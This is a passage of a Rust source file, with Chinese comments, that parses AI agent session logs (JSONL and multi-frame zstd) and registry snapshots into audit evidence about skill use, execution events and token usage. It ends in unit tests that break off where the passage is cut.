//! DSH 会话日志（JSONL）读取器 —— 触发证据（A10）。
//!
//! DSH 默认会话持久化是 `session-persistence-jsonl`，落盘在
//! `<DSH_HOME>/sessions/<project>/<id>/session.jsonl[.zstd]`。真机 58/58 都是
//! `.zstd`（R2a §6.3-1 落地 ruzstd 多帧解压后能读）；裸 `.jsonl` 等价于
//! `compression:'none'`。
//!
//! 与 SQLite（备选后端，非默认）不同：每行一个 JSON，`data` 是**内联对象**而非
//! JSON 文本串 —— 读取时 `event["data"]["source"]` 即可，无需再解一层。格式见
//! `fixtures/dsh/README.md` 与 `docs/HARNESS_ADAPTER_CONTRACT.md` 的 DSH 一节。
//!
//! **降级铁律：**任何一行不是合法 JSON、缺 header、或 schema 版本不符，就报
//! `degraded`，**绝不假装「读到了 0 条」**——报 0 次会直接伪造出假的 SV201。
//! 同样的纪律延伸到 `.zstd`：解压失败报 `zstd-decode-error`（**不是** `non-json`——
//! `non-json` 是「日志坏了」，解压失败是「reader 读不了」），`.zstd` 后缀绝不
//! 被当非 JSON 原始字节硬读。

use std::path::{Path, PathBuf};

use ruzstd::decoding::StreamingDecoder;
use serde_json::{json, Map, Value};
use std::io::{Cursor, Read};

use agent_vitals_domain::util::split_lines;

// v0.9 Stage A emitter 归位（R4 §5.2）：UsageFact emitter 从二进制
// apps/cli/src/agent/ 迁来——读文件 → 读内存，仍属 I/O 层。
pub mod usage_fact;
// P3（SourceGraph spec §5）：SourceParser 注册位——显式全量申报（zstd 帧
// 边界 ≠ 行边界，spec §11 非目标），wire 解释在 usage_fact。
pub mod parser;
/// W3：行为审计 I/O 入口（原 runtime `sessions/behavior.rs`）。
pub mod behavior;
/// W3：DSH 会话文件枚举 / workspace 索引（原 runtime `sessions/discovery.rs` 的纯部分）。
pub mod discovery;
/// W3：会话级行为 findings 评估（注册表 `sources::session_harnesses` 的 DSH 条目）。
pub mod findings;

/// DSH 自述 `SESSION_FORMAT_VERSION` 恒为 0、不作兼容承诺；不相符即降级。
/// 它是头行 `version` 字段，不是 SQLite 后端的 `PRAGMA user_version`（那是表结构版本）。
const EXPECTED_SESSION_FORMAT_VERSION: i64 = 0;

/// 行为审计规则引擎（SV601–SV610，behavior.rs）吃的执行事件类型。抽取时只做
/// 「过滤 + 原样透传」——不匹配规则、不裁决（规则引擎是另一层）。字段 shape 已对照
/// deepseek-harness 源码核实（见 docs/AGENT_BEHAVIOR_AUDIT.md §3.2 / §6.5）：
///   tool/call       data.arguments 是原始 JSON 字符串（未解析）
///   tool/result     data.error.code 六码：FS_SANDBOX_DENIED / TOOL_TIMEOUT / ABORTED /
///                   ABORTED_BEFORE_DISPATCH / UNKNOWN_TOOL / SANDBOX_UNAVAILABLE
///   approval/*      审计对按 data.id 关联（不是 callId）；outcome 四值
///   sandbox/mode    data.mode 三值
///   hook/*          hook 拦截的 invoked/result 对
///   code-dispatch*  run_code 嵌套子调用，data.arguments 是 JSON 对象（不是字符串）
///
/// **这个列表按 type 白名单过滤，是不完整的**——`skill-invocation`（用户显式
/// `/<name>` 调用，Skill 执行审计 T2）也会进 `execution_events`，但它不在这个
/// 数组里：它挂在 `user/message` 的 `data.source.kind` 上，不是独立类型，判断
/// 逻辑在调用点单独按 source.kind 加了一条（同 `is_usage_event` 对
/// `skill-catalog` 的处理）。
const EXECUTION_EVENT_TYPES: [&str; 18] = [
    "tool/call",
    "tool/result",
    "approval/asked",
    "approval/decided",
    "sandbox/mode",
    "hook/invoked",
    "hook/result",
    "tool/code-dispatch-start",
    "tool/code-dispatch",
    // 轨迹级检测器（trajectory.rs，SV611–614）的 turn/step 边界信号：
    // SV612 死循环按 turn/start 分组、SV613 停滞看 turn/end.reason.kind 与
    // step/end 心跳。原 9 类是单事件规则的证据，这四个补轨迹层的视野。
    "turn/start",
    "step/start",
    "turn/end",
    "step/end",
    // compaction/*：时间线的 ✂ 标记，prune 的 shadowedTokenCount 是执行环境实测的
    // 被丢弃 token 数（FR-04b 的浪费量来源）。放在**执行事件**而不是 usage 事件
    // 里，是因为 compaction_events 要靠这里已有的 turn/start·turn/end 给 prune
    // 顺延 turn —— prune 自身不带 turn，挂进 usage_events 会全部落成 null。
    "compaction/start",
    "compaction/summary",
    "compaction/end",
    "compaction/prune",
    // 会话日志头。本身不产 finding、也不带用量，但**所有分析都要靠它的
    // `seedLength`** 划出「这个会话自己干的」与「从上游 branch 时抄进来的
    // 历史」——不放行的话 core 的 post_fork 看不到边界，上游那笔账会被再算
    // 一遍（与 turn/start 当初被放行是同一个理由：结构信号，不是证据）。
    "session",
];

fn empty_result() -> Map<String, Value> {
    let mut map = Map::new();
    map.insert("catalog_entries".to_string(), Value::Array(Vec::new()));
    map.insert("invoked".to_string(), Value::Array(Vec::new()));
    map.insert("selected".to_string(), Value::Array(Vec::new()));
    map.insert("execution_events".to_string(), Value::Null);
    // 成本与上下文事件——与 execution_events 平行的独立字段，不污染「执行事件」
    // 语义。三个消费者共用：token_by_model（按模型汇总）、request_metrics
    // （逐请求时间序列）、context_composition（常驻上下文构成）。
    map.insert("usage_events".to_string(), Value::Null);
    map.insert("cwd".to_string(), Value::Null);
    map.insert("degraded".to_string(), Value::Bool(false));
    map
}

fn degraded(reason: &str) -> Value {
    let mut map = empty_result();
    map.insert("degraded".to_string(), json!(reason));
    Value::Object(map)
}

/// 纯解析：把整个 JSONL 文本折成触发证据。与 Python `read_session_log` 逐字节对齐。
pub fn parse_session_log(text: &str) -> Value {
    let lines = split_lines(text);
    if lines.is_empty() {
        return degraded("missing-header");
    }

    // 第 1 行是 SessionHeader（HeaderLine）：`type=="session"` 判别头行，`version`
    // 是版本闸。先验 type，再验 version —— 两者缺一即「缺 header」。
    let header: Value = match serde_json::from_str(lines[0]) {
        Ok(v) => v,
        Err(_) => return degraded("non-json"),
    };
    let htype = header.get("type").and_then(|v| v.as_str());
    let version = header.get("version");
    if htype != Some("session") || version.is_none() {
        return degraded("missing-header");
    }
    // 只认整数 0。serde_json 的 `as_i64()` 对 bool/浮点/字符串都返回 None，
    // 与 Python 侧「显式排除 bool、只收 int」逐字节对齐。
    if version.and_then(|v| v.as_i64()) != Some(EXPECTED_SESSION_FORMAT_VERSION) {
        return degraded("schema-version-mismatch");
    }
    // 工作区根（可选字段）：SV605 用它判断「工作区外写」。缺失时传 None → 退化为
    // 纯绝对路径启发式（宁可多报不误放），与 harness 能力缺失时的降级同一条纪律。
    let cwd = header.get("cwd").and_then(|v| v.as_str()).map(|s| s.to_string());

    let mut catalog_entries: Vec<String> = Vec::new();
    let mut invoked: Vec<String> = Vec::new();
    let mut selected: Vec<String> = Vec::new();
    let mut execution_events: Vec<Value> = Vec::new();
    let mut usage_events: Vec<Value> = Vec::new();
    // 会话分叉边界（可选字段）：从上游会话 branch 出来时，日志前 `seedLength`
    // 个事件是上游历史的原样拷贝。core 的 post_fork 只认这个数——它没有对应的
    // 事件类型，日志头本身也没有 `data` 字段（reshaped_event 会丢掉它），所以
    // 在这里合成一个规整形状的边界事件，两个数组各放一份：三个消费者都要看得到。
    // 缺席就是没分叉，一个事件都不滤（见 util::fork_boundary 的注释）。
    if let Some(n) = header.get("seedLength").and_then(|v| v.as_i64()).filter(|x| *x > 0) {
        let marker = json!({"type": "session", "seq": Value::Null,
                            "time": Value::Null, "data": {"seedLength": n}});
        execution_events.push(marker.clone());
        usage_events.push(marker);
    }

    for line in &lines[1..] {
        if line.trim().is_empty() {
            // 空白行不是事件，跳过（真实 writer 只在末尾补一个换行，不会产生空行）
            continue;
        }
        let event: Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(_) => return degraded("non-json"),
        };
        let etype = event.get("type").and_then(|v| v.as_str());

        // 执行事件：只「过滤 + 原样透传」，不匹配规则（规则引擎是另一层）。
        // `data` 原样保留（键序不动），`seq`/`time`/`data` 都从事件里原样取，
        // 缺了以 null 落位（绝不伪造 0 次）。
        if let Some(etype) = etype {
            // T2（Skill 执行审计）：显式调用的载体与 skill-catalog 同款处境——
            // `skill-invocation` 不是专用事件类型，挂在 user/message 的
            // data.source.kind 上。必须按 source.kind 判断，不能把 user/message
            // 整体塞进 EXECUTION_EVENT_TYPES：那会把所有用户消息（含原始 prompt
            // 文本）都收进执行事件流——体积爆炸，且把未脱敏内容带进投影和导出。
            let is_skill_invocation = event.pointer("/data/source/kind").and_then(|v| v.as_str())
                == Some("skill-invocation");
            if EXECUTION_EVENT_TYPES.contains(&etype) || is_skill_invocation {
                if let Some(ev) = reshaped_event(etype, &event) {
                    execution_events.push(ev);
                }
            }
            // 成本与上下文事件：模型标识 + usage 样本 + contextWindow + 技能目录
            // 载体。与 execution_events 同一 reshape，独立成字段，供三个消费者
            // （token_by_model / request_metrics / context_composition）共用。
            if is_usage_event(&event, etype) {
                if let Some(ev) = reshaped_event(etype, &event) {
                    usage_events.push(ev);
                }
            }
        }

        match etype {
            Some("user/message") => {
                let source = event.get("data").and_then(|d| d.get("source"));
                if let Some(source) = source {
                    match source.get("kind").and_then(|k| k.as_str()) {
                        Some("skill-catalog") => {
                            // 目录发布：`entries` 是那一刻发布的精确条目（名字 + 截断
                            // 描述）。取名字列表，覆盖上一次 ——「最近一次发布」才是
                            // 当前状态。
                            let mut names = Vec::new();
                            if let Some(entries) = source.get("entries").and_then(|e| e.as_array()) {
                                for entry in entries {
                                    if let Some(name) = entry.get("name").and_then(|n| n.as_str()) {
                                        names.push(name.to_string());
                                    }
                                }
                            }
                            catalog_entries = names;
                        }
                        Some("skill-invocation") => {
                            // 用户显式调用（`/<name>` 手势）：取 `source.name`。
                            if let Some(name) = source.get("name").and_then(|n| n.as_str()) {
                                invoked.push(name.to_string());
                            }
                        }
                        _ => {}
                    }
                }
            }
            Some("tool/call") => {
                // 模型选中加载：`arguments` 是模型产出的原始 JSON 字符串（未解析），
                // 解析后取 `name`。
                let data = event.get("data");
                if data.and_then(|d| d.get("name")).and_then(|n| n.as_str()) == Some("skill") {
                    if let Some(args_raw) = data.and_then(|d| d.get("arguments")).and_then(|a| a.as_str()) {
                        if let Ok(args) = serde_json::from_str::<Value>(args_raw) {
                            if let Some(name) = args.get("name").and_then(|n| n.as_str()) {
                                selected.push(name.to_string());
                            }
                        }
                    }
                }
            }
            _ => {}
        }
    }

    let mut map = empty_result();
    map.insert("catalog_entries".to_string(), json!(catalog_entries));
    map.insert("invoked".to_string(), json!(invoked));
    map.insert("selected".to_string(), json!(selected));
    map.insert("execution_events".to_string(), json!(execution_events));
    map.insert("usage_events".to_string(), json!(usage_events));
    map.insert("cwd".to_string(), json!(cwd));
    Value::Object(map)
}

/// `data` 原样透传的 4 键 reshape；`data` 非 object 时返回 None。
fn reshaped_event(etype: &str, event: &Value) -> Option<Value> {
    let data = event.get("data")?;
    if !data.is_object() {
        return None;
    }
    let mut ev = Map::new();
    ev.insert("type".to_string(), json!(etype));
    ev.insert("seq".to_string(), event.get("seq").cloned().unwrap_or(Value::Null));
    ev.insert("time".to_string(), event.get("time").cloned().unwrap_or(Value::Null));
    ev.insert("data".to_string(), data.clone());
    Some(Value::Object(ev))
}

/// 成本与上下文折叠需要的事件。名字沿用 `usage`，但覆盖面已扩到三个消费者：
/// `token_by_model`（按模型分桶）、`request_metrics`（逐请求时间序列）、
/// `context_composition`（常驻上下文构成）。三者共用同一个数组，各取所需，
/// 不认识的事件类型自然跳过。
///
/// - `request/header` —— 模型标识（config.model）**以及** `header.system` /
///   `header.tools`。`reshaped_event` 做的是 `data.clone()`，整个 data 都留着，
///   所以 FR-04a 要的系统提示词与工具定义不用另开一路抽取。
/// - `request/context` —— `data.contextWindow`，上下文占用率的分母，此前没有
///   任何一处保留它。真实会话里一个 session 只出现 5 次（每次模型切换各一次），
///   体积可以忽略。
/// - 承载技能目录的事件 —— 目录**不是专用事件类型**，它挂在 `user/message` /
///   `agent/inbox/spliced` 等多种事件的 `data.source` 上（真实会话验证），所以
///   按 `data.source.kind` 判断，不能用 type 白名单。真实会话只有 3 次发布。
/// - usage 样本 —— assistant/chunk 的 usage 型、带 usage 的 assistant/message。
///
/// 非 usage chunk（文本流）与无 usage 的 message 仍不保留——体积控制，且没有
/// 消费者需要它们。
/// 成本与上下文折叠需要的事件。Python 平行实现见
/// `scripts/agent_vitals/adapters/dsh.py::_is_usage_event`，那边有完整的
/// 设计说明（四个消费者共用同一个数组；`compaction/summary` 与结构兜底
/// 的来由：`compaction/summary` 曾经在这一层就被挡在外面，折叠层
/// `usage.rs` 的残差哨兵因此永远看不到它，报出"0 处漏算"这个假阴性——
/// 真实语料扫描了很久才靠人工翻原始日志才发现）。
fn is_usage_event(event: &Value, etype: &str) -> bool {
    if event.pointer("/data/source/kind").and_then(|v| v.as_str()) == Some("skill-catalog") {
        return true;
    }
    // 分叉边界同样要进 usage_events：四个消费者各自 post_fork，看不到边界
    // 就滤不掉上游会话的用量（见 util::fork_boundary 的实测数据）。
    if etype == "session" || etype == "request/header" || etype == "request/context" {
        return true;
    }
    if etype == "assistant/chunk"
        && event.pointer("/data/chunk/type").and_then(|v| v.as_str()) == Some("usage")
    {
        return true;
    }
    if etype == "assistant/message" && event.pointer("/data/usage").is_some() {
        return true;
    }
    if etype == "compaction/summary"
        && event.pointer("/data/usage").map(|v| v.is_object()).unwrap_or(false)
    {
        return true;
    }
    // 兜底：结构看着像 usage 但没被上面任何一条精确判据接住（类型不认识，
    // 或类型认识但形状不对，比如非 usage 型的 assistant/chunk）——留给折叠层
    // 的残差哨兵去报警，不在这里悄悄丢掉。宽进（这里）、严出（真正计价只走
    // `usage::usage_sample` 的显式白名单），两条路径不能合并成一条，否则
    // 同一笔用量在多个事件里重复出现时会被双计。
    event
        .get("data")
        .and_then(|d| agent_vitals_domain::usage::usage_shaped_tokens(d, 0))
        .is_some()
}

/// 增量多帧 zstd → 拼接后的纯文本字节。
///
/// DSH 会话日志是**增量多帧压缩**：每 flush 一批事件就把新一帧 zstd 追加到同一
/// 文件（真机实测：4MB = 6694 帧、882KB = 2090 帧、首帧仅 ~207 字节 ≈ 1 行事件），
/// 每帧是独立自洽的压缩 JSONL 块、帧间无跨帧状态（R2a §3.4）。ruzstd 的
/// `StreamingDecoder` 一次只解一帧，用 `Cursor` 计数逐帧推进（`Cursor::position`
/// 随 `Read` 前进）——解完一帧看它消费了多少源字节，据此切到下一帧。
///
/// 任何一帧解析/读取失败（损坏、截断）→ `None` → 调用方报 `zstd-decode-error`，
/// 绝不拿半截结果当「读到了 N 条」。
pub fn decode_zstd_multi_frame(bytes: &[u8]) -> Option<Vec<u8>> {
    // 空输入 = 0 帧 = 空文本（与 Python `zstandard` 对空输入给 `b''` 对齐——
    // 空会话文件该报 missing-header，不是 zstd-decode-error）。
    if bytes.is_empty() {
        return Some(Vec::new());
    }
    let mut out = Vec::new();
    let mut pos = 0usize;
    loop {
        let consumed = {
            let mut cursor = Cursor::new(&bytes[pos..]);
            let mut decoder = StreamingDecoder::new(&mut cursor).ok()?;
            let mut frame = Vec::new();
            Read::read_to_end(&mut decoder, &mut frame).ok()?;
            out.extend_from_slice(&frame);
            cursor.position() as usize
        };
        if consumed == 0 {
            // 没有进展：帧头合法但解不出字节（截断帧）——防死循环。
            return None;
        }
        pos += consumed;
        if pos >= bytes.len() {
            break;
        }
    }
    Some(out)
}

/// Failure to decode a bounded Zstandard source.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ZstdDecodeError { InvalidData, LimitExceeded }

/// Bounded counterpart used by generic plugin previews; the limit applies to
/// decompressed bytes so a small compressed fixture cannot bypass corpus limits.
pub fn decode_zstd_multi_frame_limited(bytes: &[u8], limit: usize) -> Result<Vec<u8>, ZstdDecodeError> {
    if bytes.is_empty() { return Ok(Vec::new()); }
    let mut out = Vec::new();
    let mut pos = 0usize;
    loop {
        let consumed = {
            let mut cursor = Cursor::new(&bytes[pos..]);
            let mut decoder = StreamingDecoder::new(&mut cursor).map_err(|_| ZstdDecodeError::InvalidData)?;
            let mut frame = [0u8; 8192];
            loop {
                let n = decoder.read(&mut frame).map_err(|_| ZstdDecodeError::InvalidData)?;
                if n == 0 { break; }
                if out.len().saturating_add(n) > limit { return Err(ZstdDecodeError::LimitExceeded); }
                out.extend_from_slice(&frame[..n]);
            }
            cursor.position() as usize
        };
        if consumed == 0 { return Err(ZstdDecodeError::InvalidData); }
        pos += consumed;
        if pos >= bytes.len() { break; }
    }
    Ok(out)
}

/// 读会话日志文本：`.zstd` 后缀 → 多帧解压，其余原样。返回 `Ok(text)` 或降级码。
///
/// - 文件缺失/不可读 → `file-missing`
/// - zstd 解压失败 → `zstd-decode-error`（**不是** `non-json`）
///
/// 非 UTF-8 字节替换为 U+FFFD（与 Python `errors="replace"` 对齐）。Python 平行
/// 实现在 `scripts/agent_vitals/adapters/dsh.py`（可选 `zstandard`；缺席时 `.zstd`
/// 报 `unsupported-compression`——宿内 skill 不拉第三方库，见 spec §7.1 G1）。
pub fn read_session_text(path: &Path) -> Result<String, &'static str> {
    let bytes = match std::fs::read(path) {
        Ok(b) => b,
        Err(_) => return Err("file-missing"),
    };
    if path.extension().map(|e| e == "zstd").unwrap_or(false) {
        let out = decode_zstd_multi_frame(&bytes).ok_or("zstd-decode-error")?;
        return Ok(String::from_utf8_lossy(&out).into_owned());
    }
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

/// 读文件（`.zstd` 后缀 → 多帧解压；非 UTF-8 字节替换为 U+FFFD，与 Python
/// `errors="replace"` 对齐），再交给纯解析。降级码：文件缺失/不可读 →
/// `file-missing`；zstd 解压失败 → `zstd-decode-error`；两者都不是 `non-json`。
pub fn read_session_log(path: &Path) -> Value {
    match read_session_text(path) {
        Ok(text) => parse_session_log(&text),
        Err(code) => degraded(code),
    }
}

/// 读一次会话日志证据，来自环境变量 `AGENT_VITALS_DSH_SESSION_LOG`。
///
/// 返回 `(source, evidence)`：source 是环境变量原始值（进报告里的 source 串），
/// evidence 是 `read_session_log` 的 dict；未设置时两者都是 None。环境变量可指向
/// `.jsonl`/`.zstd` 文件或目录——目录则读其中的 `session.jsonl`（与默认落盘路径
/// `<DSH_HOME>/sessions/<project>/<id>/session.jsonl` 对齐）；没有裸 jsonl 再退到
/// `session.jsonl.zstd`（真机 58/58 是 zstd，目录里通常只有它）。读不到的降级由
/// `read_session_log` 兜底成 `degraded="file-missing"`，**不冒充「没有证据」**。
pub fn read_session_evidence() -> (Option<String>, Option<Value>) {
    let raw = match std::env::var("AGENT_VITALS_DSH_SESSION_LOG") {
        Ok(v) if !v.is_empty() => v,
        _ => return (None, None),
    };
    let mut path = PathBuf::from(&raw);
    if path.is_dir() {
        path = path.join("session.jsonl");
        if !path.exists() {
            let zstd = PathBuf::from(format!("{}.zstd", path.display()));
            if zstd.exists() {
                path = zstd;
            }
        }
    }
    (Some(raw), Some(read_session_log(&path)))
}

fn snapshot_empty() -> Map<String, Value> {
    let mut map = Map::new();
    map.insert("catalog_entries".to_string(), Value::Array(Vec::new()));
    map.insert("complete".to_string(), Value::Null);
    map.insert("observer".to_string(), Value::Null);
    map.insert("written_at".to_string(), Value::Null);
    map.insert("degraded".to_string(), Value::Bool(false));
    map
}

fn snapshot_degraded(reason: &str) -> Value {
    let mut map = snapshot_empty();
    map.insert("degraded".to_string(), json!(reason));
    Value::Object(map)
}

/// 纯解析：把 ``--runtime-json`` 摄入的注册表快照折成 probe 证据。与 Python
/// `read_snapshot` 逐字节对齐。
///
/// 快照是 ``ctx.skills.snapshot()`` 的产物，由 dsh-agent-vitals 的 glue plugin
/// 写到 ``$DSH_HOME/agent-vitals/snapshot.json``。形状（见 DSH_INTEGRATION §2.2.1）：
///
/// ```text
/// {"schema_version": "1.0", "producer": "dsh-agent-vitals", "observer": null,
///  "skills": [{"name": "...", "description": "...", ...}], "complete": true,
///  "written_at": "ISO8601"}
/// ```
///
/// 映射（契约「Two independent evidence sources」，**绝不折叠**）：
///   - ``complete === true``  → 快照里的名字是「此刻这个 scope 解析出的目录」；
///   - ``complete === false`` → 全部 ``unknown``，不是 ``false``；
///   - 缺失 / 畸形 / schema 不符 → ``degraded``（``unavailable``），绝不报 0 次。
pub fn parse_snapshot(text: &str) -> Value {
    let doc: Value = match serde_json::from_str(text) {
        Ok(v) => v,
        Err(_) => return snapshot_degraded("non-json"),
    };
    let obj = match doc.as_object() {
        Some(o) => o,
        None => return snapshot_degraded("not-an-object"),
    };

    let skills = match obj.get("skills").and_then(|v| v.as_array()) {
        Some(a) => a,
        None => return snapshot_degraded("missing-skills"),
    };
    let complete = match obj.get("complete").and_then(|v| v.as_bool()) {
        Some(b) => b,
        // complete 是「发现是否完整」的二态闸，任何非布尔都不能当 partial 答案用；
        // 把 0/1 当 complete 会在下面把「部分答案」误判成「目录为空」。
        None => return snapshot_degraded("missing-complete"),
    };

    let mut names = Vec::new();
    for entry in skills {
        if let Some(name) = entry.get("name").and_then(|n| n.as_str()) {
            names.push(name.to_string());
        }
    }
    let observer = obj
        .get("observer")
        .and_then(|v| v.as_str())
        .map(|s| json!(s))
        .unwrap_or(Value::Null);
    let written_at = obj
        .get("written_at")
        .and_then(|v| v.as_str())
        .map(|s| json!(s))
        .unwrap_or(Value::Null);

    let mut map = snapshot_empty();
    map.insert("catalog_entries".to_string(), json!(names));
    map.insert("complete".to_string(), json!(complete));
    map.insert("observer".to_string(), observer);
    map.insert("written_at".to_string(), written_at);
    Value::Object(map)
}

/// 读文件（非 UTF-8 字节替换为 U+FFFD，与 Python `errors="replace"` 对齐），再交给
/// 纯解析。文件缺失/不可读时降级为 `file-missing`。
pub fn read_snapshot(path: &Path) -> Value {
    let bytes = match std::fs::read(path) {
        Ok(b) => b,
        Err(_) => return snapshot_degraded("file-missing"),
    };
    let text = String::from_utf8_lossy(&bytes).into_owned();
    parse_snapshot(&text)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// checked-in fixture 的绝对路径 —— D4 迁进 harnesses crate 后 `CARGO_MANIFEST_DIR`
    /// 是 `crates/agent-vitals-harnesses/`，仓库 `fixtures/` 在其上两级。
    fn fixture(rel: &str) -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../..").join(rel)
    }

    #[test]
    fn reads_all_three_evidence_kinds() {
        let text = r#"{"type":"session","version":0,"id":"s","createdAt":1,"delegationDepth":0}
{"type":"user/message","seq":0,"time":2,"data":{"source":{"kind":"skill-catalog","entries":[{"name":"a","description":"d"},{"name":"b"}]}},"surfaceOp":"append"}
{"type":"user/message","seq":1,"time":3,"data":{"source":{"kind":"skill-invocation","name":"b"}},"surfaceOp":"append"}
{"type":"tool/call","seq":2,"time":4,"data":{"name":"skill","arguments":"{\"name\":\"b\"}"}}
"#;
        let v = parse_session_log(text);
        assert_eq!(v["catalog_entries"], json!(["a", "b"]));
        assert_eq!(v["invoked"], json!(["b"]));
        assert_eq!(v["selected"], json!(["b"]));
        assert_eq!(v["degraded"], json!(false));
    }

    /// T2（Skill 执行审计 P0）：`skill-invocation` 载体不再只喂 `invoked` 那份
    /// 蒸发掉 turn/step/seq/time 的名字列表——它现在原样进 `execution_events`，
    /// 带着 seq/time（以及后续靠 turn/step 边界顺延得到的坐标）。`user/message`
    /// 本身不在 `EXECUTION_EVENT_TYPES` 白名单里：断言旁边那条不带 skill-invocation
    /// 载体的普通用户消息没有跟着混进去，才说明判定是按 source.kind 而不是按
    /// type 放行的。
    #[test]
    fn skill_invocation_carrier_enters_execution_events_with_seq_and_time() {
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"user/message","seq":0,"time":100,"data":{"content":[{"type":"text","text":"hello"}]},"surfaceOp":"append"}
{"type":"user/message","seq":1,"time":200,"data":{"source":{"kind":"skill-invocation","name":"b"}},"surfaceOp":"append"}
"#;
        let v = parse_session_log(text);
        let evs = v["execution_events"].as_array().unwrap();
        assert_eq!(evs.len(), 1, "普通 user/message（无 skill-invocation 载体）不得混入");
        assert_eq!(evs[0]["type"], json!("user/message"));
        assert_eq!(evs[0]["seq"], json!(1));
        assert_eq!(evs[0]["time"], json!(200));
        assert_eq!(evs[0]["data"]["source"]["name"], json!("b"));
    }

    #[test]
    fn last_catalog_wins() {
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"user/message","seq":0,"time":1,"data":{"source":{"kind":"skill-catalog","entries":[{"name":"a"}]}},"surfaceOp":"append"}
{"type":"user/message","seq":1,"time":2,"data":{"source":{"kind":"skill-catalog","entries":[{"name":"c"},{"name":"d"}]}},"surfaceOp":"append"}
"#;
        let v = parse_session_log(text);
        assert_eq!(v["catalog_entries"], json!(["c", "d"]));
        assert_eq!(v["degraded"], json!(false));
    }

    #[test]
    fn empty_text_is_missing_header() {
        assert_eq!(parse_session_log("")["degraded"], json!("missing-header"));
    }

    #[test]
    fn non_json_first_line_degrades() {
        assert_eq!(parse_session_log("not json\n")["degraded"], json!("non-json"));
    }

    #[test]
    fn non_json_event_line_degrades_not_zero() {
        // 读到一半遇到垃圾行：必须报 degraded，而不是拿着半截结果说「读了 N 条」。
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"user/message","seq":0,"time":1,"data":{"source":{"kind":"skill-catalog","entries":[{"name":"a"}]}},"surfaceOp":"append"}
garbage line
"#;
        let v = parse_session_log(text);
        assert_eq!(v["degraded"], json!("non-json"));
    }

    #[test]
    fn header_without_session_type_is_missing() {
        let v = parse_session_log("{\"type\":\"event\",\"seq\":0}\n");
        assert_eq!(v["degraded"], json!("missing-header"));
    }

    #[test]
    fn version_mismatch_degrades() {
        let v = parse_session_log("{\"type\":\"session\",\"version\":1,\"id\":\"s\"}\n");
        assert_eq!(v["degraded"], json!("schema-version-mismatch"));
    }

    #[test]
    fn bool_version_is_a_mismatch_not_a_pass() {
        // Python 里 `False == 0`；若不显式排除 bool，`{"version": false}` 会溜过版本闸。
        let v = parse_session_log("{\"type\":\"session\",\"version\":false,\"id\":\"s\"}\n");
        assert_eq!(v["degraded"], json!("schema-version-mismatch"));
    }

    #[test]
    fn missing_file_degrades() {
        let v = read_session_log(Path::new("/nonexistent-xyz/session.jsonl"));
        assert_eq!(v["degraded"], json!("file-missing"));
        assert_eq!(v["catalog_entries"], json!([]));
        assert_eq!(v["execution_events"], Value::Null);
    }

    /// ruzstd 压缩帧的工具：把一段文本压成一帧并 append 到 `frames`。
    /// 每帧独立（同 `dsh_autosync.py::_decompress_zstd` 面对的真实文件结构）。
    fn append_frame(frames: &mut Vec<u8>, text: &str) {
        ruzstd::encoding::compress(
            text.as_bytes(),
            frames,
            ruzstd::encoding::CompressionLevel::Fastest,
        );
    }

    #[test]
    fn decode_zstd_multi_frame_roundtrips_concatenated_frames() {
        let mut frames = Vec::new();
        append_frame(&mut frames, "{\"type\":\"session\",\"version\":0,\"id\":\"s\",\"delegationDepth\":0}\n");
        append_frame(&mut frames, "{\"type\":\"user/message\",\"seq\":0,\"time\":1,\"data\":{\"source\":{\"kind\":\"skill-catalog\",\"entries\":[{\"name\":\"a\"}]}},\"surfaceOp\":\"append\"}\n");
        append_frame(&mut frames, "{\"type\":\"turn/start\",\"seq\":1,\"time\":2,\"data\":{\"turn\":1}}\n");
        let out = decode_zstd_multi_frame(&frames).unwrap();
        let text = String::from_utf8(out).unwrap();
        let v = parse_session_log(&text);
        assert_eq!(v["catalog_entries"], json!(["a"]));
        assert_eq!(v["degraded"], json!(false));
        // 多帧拼接后是完整日志：execution_events 含 turn/start 边界信号。
        let evs = v["execution_events"].as_array().unwrap();
        assert_eq!(evs[0]["type"], json!("turn/start"));
    }

    #[test]
    fn decode_zstd_multi_frame_handles_single_frame() {
        let mut frames = Vec::new();
        append_frame(&mut frames, "hello zstd\n");
        let out = decode_zstd_multi_frame(&frames).unwrap();
        assert_eq!(out, b"hello zstd\n");
    }

    #[test]
    fn decode_zstd_multi_frame_limited_caps_decompressed_size() {
        let mut frames = Vec::new();
        append_frame(&mut frames, "0123456789");
        assert_eq!(decode_zstd_multi_frame_limited(&frames, 10).unwrap(), b"0123456789");
        assert_eq!(decode_zstd_multi_frame_limited(&frames, 9), Err(ZstdDecodeError::LimitExceeded));
        assert_eq!(decode_zstd_multi_frame_limited(b"invalid zstd", 10), Err(ZstdDecodeError::InvalidData));
        let mut multi = frames.clone();
        append_frame(&mut multi, "abc");
        assert_eq!(decode_zstd_multi_frame_limited(&multi, 13).unwrap(), b"0123456789abc");
        assert_eq!(decode_zstd_multi_frame_limited(&multi, 12), Err(ZstdDecodeError::LimitExceeded));
        multi.pop();
        assert_eq!(decode_zstd_multi_frame_limited(&multi, 13), Err(ZstdDecodeError::InvalidData));
    }

    #[test]
    fn decode_zstd_multi_frame_garbage_is_error() {
        // 任意字节不是合法 zstd 帧 → None（调用方报 zstd-decode-error），
        // 绝不把损坏当 0 条数据。
        assert!(decode_zstd_multi_frame(b"this is not zstd at all").is_none());
        assert!(decode_zstd_multi_frame(b"").is_some()); // 空输入 = 0 帧 = 合法空
        // 截断帧：合法帧头 + 被砍断的块。
        let mut full = Vec::new();
        append_frame(&mut full, "some content to compress");
        let cut = &full[..full.len() / 2];
        assert!(decode_zstd_multi_frame(cut).is_none());
    }

    #[test]
    fn read_session_log_zstd_file_decodes_to_evidence() {
        let t = std::env::temp_dir().join(format!("av-dsh-zstd-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&t);
        std::fs::create_dir_all(&t).unwrap();
        let mut frames = Vec::new();
        append_frame(&mut frames, "{\"type\":\"session\",\"version\":0,\"id\":\"s\",\"delegationDepth\":0}\n");
        append_frame(&mut frames, "{\"type\":\"user/message\",\"seq\":0,\"time\":1,\"data\":{\"source\":{\"kind\":\"skill-invocation\",\"name\":\"b\"}},\"surfaceOp\":\"append\"}\n");
        let path = t.join("session.jsonl.zstd");
